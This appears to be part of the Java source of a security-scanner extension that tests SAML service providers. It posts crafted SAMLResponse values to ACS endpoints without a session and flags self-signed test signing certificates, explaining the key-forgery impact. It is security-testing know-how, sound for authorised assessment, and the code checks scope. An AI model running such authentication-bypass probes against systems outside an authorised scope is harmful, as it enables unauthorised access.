    private HttpRequestResponse postSamlResponse(String acsUrl, String samlResponse, String relayState, UnaryOperator<HttpRequest> withSession) {
        HttpRequest req = buildAcsPost(acsUrl, samlResponse, relayState);
        return send(withSession != null ? withSession.apply(req) : req);
    }

    /** POST SAMLResponse with NO session attached — the unsigned-assertion test proves auth FROM the assertion
     *  alone, so an existing valid cookie must not mask the result. */
    private HttpRequestResponse postSamlResponseNoSession(String acsUrl, String samlResponse, String relayState) {
        return send(buildAcsPost(acsUrl, samlResponse, relayState));
    }

    private HttpRequest buildAcsPost(String acsUrl, String samlResponse, String relayState) {
        StringBuilder body = new StringBuilder("SAMLResponse=").append(urlEnc(samlResponse));
        if (relayState != null) body.append("&RelayState=").append(urlEnc(relayState));
        return HttpRequest.httpRequestFromUrl(acsUrl).withMethod("POST")
                .withUpdatedHeader("Content-Type", "application/x-www-form-urlencoded")
                .withBody(body.toString());
    }

    private HttpRequestResponse send(HttpRequest req) {
        try {
            return AiScanner.decompress(api.http().sendRequest(req, RequestOptions.requestOptions().withResponseTimeout(15000L)));
        } catch (Throwable t) { return null; }
    }

    // ------------------------------------------------------------------ parsing / util helpers

    /** Discover a return/redirect param name generically from an SP request's params or a Location query. */
    private static String findReturnParam(HttpRequest req, String location) {
        try {
            for (ParsedHttpParameter p : req.parameters())
                if (p.type() == HttpParameterType.URL && RETURN_PARAM.matcher(p.name()).matches()) return p.name();
        } catch (Throwable ignore) { }
        // else look in the request URL query and the Location query.
        for (String q : new String[]{ req == null ? null : req.url(), location }) {
            if (q == null) continue;
            int qm = q.indexOf('?'); if (qm < 0) continue;
            for (String pair : q.substring(qm + 1).split("&")) {
                int eq = pair.indexOf('='); String name = eq < 0 ? pair : pair.substring(0, eq);
                if (RETURN_PARAM.matcher(name).matches()) return name;
            }
        }
        return null;
    }

    /** Extract a form's action URL when its markup mentions SAMLResponse (resolve relative to the page URL). */
    private static String formActionFor(String body, String pageUrl) {
        Matcher fm = Pattern.compile("(?is)<form\\b[^>]*>(.*?)</form>").matcher(body);
        while (fm.find()) {
            String form = fm.group();
            if (!form.toLowerCase().contains("samlresponse")) continue;
            String action = attr(form.substring(0, Math.min(form.length(), form.indexOf('>') + 1)), "action");
            if (action == null || action.isBlank()) return Net.stripQuery(pageUrl);   // self-post
            try { return URI.create(pageUrl).resolve(action).toString(); } catch (Exception e) { return action; }
        }
        return null;
    }

    /** Value of an HTML/XML attribute inside a single tag string, or null. */
    private static String attr(String tag, String name) {
        Matcher m = Pattern.compile("(?i)\\b" + Pattern.quote(name) + "\\s*=\\s*\"([^\"]*)\"").matcher(tag);
        return m.find() ? m.group(1) : null;
    }

    /** Absolute host a Location header would send the browser to (resolves relative Locations against the base). */
    private static String redirectHost(String location, String baseUrl) {
        try {
            URI u = URI.create(location.trim());
            if (u.getHost() != null) return u.getHost();
            return URI.create(baseUrl).resolve(location).getHost();   // relative → same host (not off-domain)
        } catch (Exception e) { return null; }
    }

    private boolean inScope(String host, String url) {
        try { if (!api.scope().isInScope(url)) return false; } catch (Throwable ignore) { }
        return host == null || host.equalsIgnoreCase(hostOf(url));
    }

    private static String safeBody(HttpRequestResponse rr) {
        try { return rr != null && rr.response() != null ? rr.response().bodyToString() : null; } catch (Throwable t) { return null; }
    }
    // ------------------------------------------------------------------ 0) Public / test certificate check

    /** Fire HIGH when an SP metadata cert is self-signed AND its Subject CN matches a test-credential pattern.
     *  Detection is purely generic: no fingerprint list, no library name — just observable cert properties.
     *  A single finding per host (multiple certs with the same signal → one issue). */
    private boolean checkPublicTestCert(Surface s) {
        if (s.metadataXml == null || s.metadataRr == null) return false;
        Matcher m = Pattern.compile("<(?:[A-Za-z0-9]+:)?X509Certificate[^>]*>([^<]+)</(?:[A-Za-z0-9]+:)?X509Certificate>")
                .matcher(s.metadataXml);
        java.util.Set<String> seen = new java.util.LinkedHashSet<>();   // dedup identical certs
        while (m.find()) seen.add(m.group(1).replaceAll("\\s+", ""));
        for (String b64Der : seen) {
            String cn = certSubjectCn(b64Der);
            if (cn == null || !isSelfSigned(b64Der)) continue;
            if (!TEST_CERT_CN.matcher(cn).find()) continue;
            String authRequestNote = s.authnRequestsSigned
                    ? " The SP signs outbound authentication requests with this key (AuthnRequestsSigned=\"true\"), so"
                      + " its request signatures can be forged; whether the IdP acts on a forged signed request"
                      + " depends on the IdP verifying SP signatures."
                    : "";
            scanLog.found("SAML signing key is a self-signed test certificate", s.metadataUrl(),
                    "The SP metadata contains a self-signed certificate (CN=\"" + cn + "\") whose name "
                    + "indicates it is a library-shipped test or demo credential. Such certificates and their "
                    + "private keys are typically distributed publicly with the SAML library (source repository, "
                    + "package registry), making the private key effectively public (CWE-321: Use of Hard-coded "
                    + "Cryptographic Key)."
                    + authRequestNote
                    + " Concrete impact of the public private key: (1) forgery of anything the SP itself signs with "
                    + "it (metadata, AuthnRequest/LogoutRequest) — request-integrity tampering, not a user login by "
                    + "itself; (2) decryption of any assertion encrypted to this key if the same keypair covers the "
                    + "encryption slot. This is demonstrated at the key-material/config layer (end-to-end acceptance "
                    + "of a forged message was not proven here). Replace with a fresh, environment-specific keypair.",
                    false, s.metadataRr);
            scanLog.incFinding();
            return true;
        }
        return false;
    }

    /** Subject CN of an X.509 certificate given as a base64-encoded DER blob, or null on error. */
    private static String certSubjectCn(String b64Der) {
        try {
            byte[] der = Base64.getDecoder().decode(b64Der);
            java.security.cert.CertificateFactory cf = java.security.cert.CertificateFactory.getInstance("X.509");
            java.security.cert.X509Certificate cert = (java.security.cert.X509Certificate)
                    cf.generateCertificate(new java.io.ByteArrayInputStream(der));
            String dn = cert.getSubjectX500Principal().getName();
            Matcher m = Pattern.compile("(?i)CN=([^,]+)").matcher(dn);
            return m.find() ? m.group(1).trim() : null;
        } catch (Throwable t) { return null; }
    }

    /** True if the certificate is self-signed (Issuer DN == Subject DN). */
    private static boolean isSelfSigned(String b64Der) {
        try {
            byte[] der = Base64.getDecoder().decode(b64Der);
            java.security.cert.CertificateFactory cf = java.security.cert.CertificateFactory.getInstance("X.509");
            java.security.cert.X509Certificate cert = (java.security.cert.X509Certificate)
                    cf.generateCertificate(new java.io.ByteArrayInputStream(der));
            return cert.getSubjectX500Principal().equals(cert.getIssuerX500Principal());
        } catch (Throwable t) { return false; }
    }

    private static String xmlEsc(String s) {
        return s == null ? "" : s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
    }
    private static String urlEnc(String s) { return java.net.URLEncoder.encode(s, StandardCharsets.UTF_8); }
    private static String pathOf(String url) { try { String p = URI.create(url).getPath(); return p == null ? "" : p; } catch (Exception e) { return url; } }
    private static String hostOf(String url) { return Net.authority(url); }
    private static String yn(boolean b) { return b ? "yes" : "no"; }
}
